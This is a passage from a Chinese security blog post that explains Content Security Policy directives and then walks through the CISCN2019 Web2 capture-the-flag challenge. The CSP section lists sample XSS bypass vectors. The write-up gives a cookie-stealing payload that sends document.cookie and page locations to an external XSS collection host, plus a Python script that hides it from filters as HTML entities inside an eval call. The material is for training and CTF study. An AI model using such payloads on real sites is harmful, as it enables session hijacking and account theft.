<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 错误的写法</span><br><span class="line">script-src https:&#x2F;&#x2F;host1.com; script-src https:&#x2F;&#x2F;host2.com</span><br><span class="line"># 正确的写法</span><br><span class="line">script-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com</span><br><span class="line">如果不设置某个限制选项，就是默认允许任何</span><br></pre></td></tr></table></figure>

<h2 id="script-src-的特殊值"><a href="#script-src-的特殊值" class="headerlink" title="script-src 的特殊值"></a>script-src 的特殊值</h2><p>除了常规值，script-src还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#39;unsafe-inline&#39;：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数</span><br><span class="line">unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。</span><br><span class="line">nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</span><br><span class="line">hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</span><br></pre></td></tr></table></figure>
<p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#39;</span><br></pre></td></tr></table></figure>
<p>页面内嵌脚本，必须有这个token才能执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">  &#x2F;&#x2F; some code</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng&#x3D;&#39;</span><br></pre></td></tr></table></figure>
<p>下面的代码就会允许执行，因为hash值相符。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;Hello, world.&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<p>注意，计算hash值的时候，<code>&lt;script&gt;</code>标签不算在内。</p>
<p>除了script-src选项，nonce值和hash值还可以用在style-src选项，控制页面内嵌的样式表。</p>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>（1）script-src和object-src是必设的，除非设置了default-src。</p>
<p>因为攻击者只要能注入脚本，其他限制都可以规避。而object-src必设是因为 Flash 里面可以执行外部脚本。</p>
<p>（2）script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data:URL。</p>
<p>下面是两个恶意攻击的例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;evil()&quot;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;data:text&#x2F;javascript,evil()&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>（3）必须特别注意 JSONP 的回调函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script</span><br><span class="line">src&#x3D;&quot;&#x2F;path&#x2F;jsonp?callback&#x3D;alert(document.domain)&#x2F;&#x2F;&quot;&gt;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码中，虽然加载的脚本来自当前域名，但是通过改写回调函数，攻击者依然可以执行恶意代码。</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p><a href="https://mochu.blog.csdn.net/article/details/105212961" target="_blank" rel="noopener">https://mochu.blog.csdn.net/article/details/105212961</a></p>
<p>投稿存在XSS，但是存在一些过滤，使用Markup<br>转码，然后eval执行JS代码，并且需要一个window.location.href来自动触发刷新颜面<br>使用题目提供的站内XSS平台</p>
<p>添加windows.location.href，并删去if判断那一段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;window.location.href&#x3D;&#39;http:&#x2F;&#x2F;xss.buuoj.cn&#x2F;index.php?do&#x3D;api&amp;id&#x3D;arHAGx&amp;location&#x3D;&#39;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;toplocation&#x3D;&#39;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;cookie&#x3D;&#39;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)())+&#39;&amp;opener&#x3D;&#39;+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:&#39;&#39;&#125;catch(e)&#123;return &#39;&#39;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure>
<p>然后利用脚本，进行编码绕过，并且执行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xss=<span class="string">'''(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=arHAGx&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();'''</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xss:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure>


<p>参考文章:<br>前端HACK之XSS攻击个人学习笔记 <a href="http://www.cnfluffy.com/2019-03-11/4963" target="_blank" rel="noopener">http://www.cnfluffy.com/2019-03-11/4963</a><br>dom型<br><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/DOMXSS.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/DOMXSS.md</a><br>解码顺序  <a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md</a>   </p>
<p><a href="https://www.ruanyifeng.com/blog/2016/09/csp.html" target="_blank" rel="noopener">Content Security Policy 入门教程</a></p>
</div><div class="post-copyright"><div class="post-copyright-author"><span class="post-copyright-meta">本文作者: </span><span class="post-copyright-info"><a href="mailto:undefined">ye1s</a></span></div><div class="post-copyright-type"><span class="post-copyright-meta">本文链接: </span><span class="post-copyright-info"><a href="https://blog.cfyqy.com/article/c84cebac.html">https://blog.cfyqy.com/article/c84cebac.html</a></span></div><div class="post-copyright-notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.cfyqy.com">ye1s</a>！</span></div></div><div class="post-copyright" id="comments-container"><script src="/js/comments/gitment.js"></script></div><script>let arr = location.href.split('/#more')[0].split('/');
let title = arr[arr.length - 1];
if (title === '') {
    title = arr[arr.length - 2]
}
var flag = false;
var gitFun = function () {
    try {
        var gitmentObj = window.GLOBAL_CONFIG.gitment;
        var gitment = new Gitment({
            id: decodeURI(title), // 可选。默认为 location.href
            owner: gitmentObj.owner,
            repo: gitmentObj.repo,
            oauth: {
                client_id: gitmentObj.client_id,
                client_secret: gitmentObj.client_secret
            },
        });
        gitment.render('comments-container');
        flag = true;
    } catch (e) {
        flag = false;
    }
}
var setIn = setInterval(() => {
    if (!flag) {
        gitFun();
    } else {
        clearInterval(setIn);
    }
}, 200);</script></article><div id="pagination"><div class="prev-post pull-left"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/72e5cf06.html"><i class="fas fa-angle-left">&nbsp;</i><span>同源策略</span></a></div><div class="next-post pull-right"><span class="line line-top"></span><span class="line line-right"></span><span class="line line-bottom"></span><span class="line line-left"></span><a href="/article/dc7e61bd.html"><span>xxe漏洞</span><span>&nbsp;</span><i class="fas fa-angle-right"></i></a></div></div><!--div!= paginator()--></div></div><div class="button-hover" id="return-top"><i class="fas fa-arrow-up" aria-hidden="true"></i></div><footer><div id="footer"><div class="button-hover" id="side-button"><i class="fas fa-arrow-right"></i></div><div class="right-content"><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fas fa-file-o"></i></span><span id="busuanzi_value_page_pv"></span><span></span></div><div class="copyright">&copy;2017 ～ 2021 By ye1s</div></div></div></footer></div><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery-3.3.1.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/velocity.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/thirdparty/jquery.mCustomScrollbar.concat.min.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/fan.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/canvas_bg.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/utils.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/scroll.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/sidebar.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/copy.js"></script><!--script(src=url)--><!--js(src=url_for(url) + '?version=' + version())--><script src="/js/daovoice.js"></script><!--script(src=url)--><div class="search-dialog"><div id="algolia-search-title">Algolia</div><div class="search-close-button"><i class="fa fa-times"></i></div><!--div#current-refined-values--><!--div#clear-all--><div id="search-box"></div><!--div#refinement-list--><hr><div id="hits"></div><div id="algolia-pagination"></div></div><div class="search-mask"></div><script src="/js/search/algolia.js"></script></body></html>